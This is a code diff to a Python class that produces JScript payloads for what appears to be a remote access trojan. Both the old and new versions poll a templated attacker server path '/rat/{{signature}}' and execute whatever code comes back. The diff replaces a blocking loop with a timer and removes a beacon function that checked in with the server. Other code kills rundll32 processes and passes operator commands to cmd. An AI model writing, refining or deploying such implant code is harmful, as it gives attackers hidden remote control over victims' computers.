@@ -38,23 +38,7 @@ class payload():
         f.Delete();
         count = message.split('rundll32').length-1;
         if(count == 1){
-            while(true)
-            {
-                try
-                {
-                    h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
-                    h.SetTimeouts(0, 0, 0, 0);
-                    h.Open("GET","http://{{server}}/rat/{{signature}}",false);
-                    h.Send();
-                    c = h.ResponseText;
-                    eval(c)
-                }
-                catch(error)
-                {
-                    windows.close()           
-                }
-                                            
-            }
+            setInterval('try {h = new ActiveXObject("WinHttp.WinHttpRequest.5.1");h.SetTimeouts(0, 0, 0, 0);h.Open("GET", "http://{{server}}/rat/{{signature}}", false);h.Send();c = h.ResponseText;setTimeout(c);}catch(error){windows.close()}', 3000)                   
         }else if(count>=3){
            new ActiveXObject("WScript.Shell").Run("cmd /c taskkill /f /im rundll32.exe",0,true);
         }else{
@@ -62,25 +46,7 @@ class payload():
         }
         '''
         return client_payload
-    def heartbeat(self):
-        p = '''
-        function delay(){
-            try{
-                p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
-                p.Open("GET","http://127.0.0.1:65033/",false);
-                p.Send('')
-            }catch(err){
-            }
-        }
-        delay()
-        delay()
-        delay()
-        message = "success"
-        p=new ActiveXObject("WinHttp.WinHttpRequest.5.1");
-        p.Open("GET","http://{{server}}/heartbeat/{{signature}}",false);
-        p.Send('');
-        '''
-        return p
+
     def cmd(self, command):
         command = command.replace('\\', '\\\\').replace('\"', '\\\"')
         #cmd /c ?
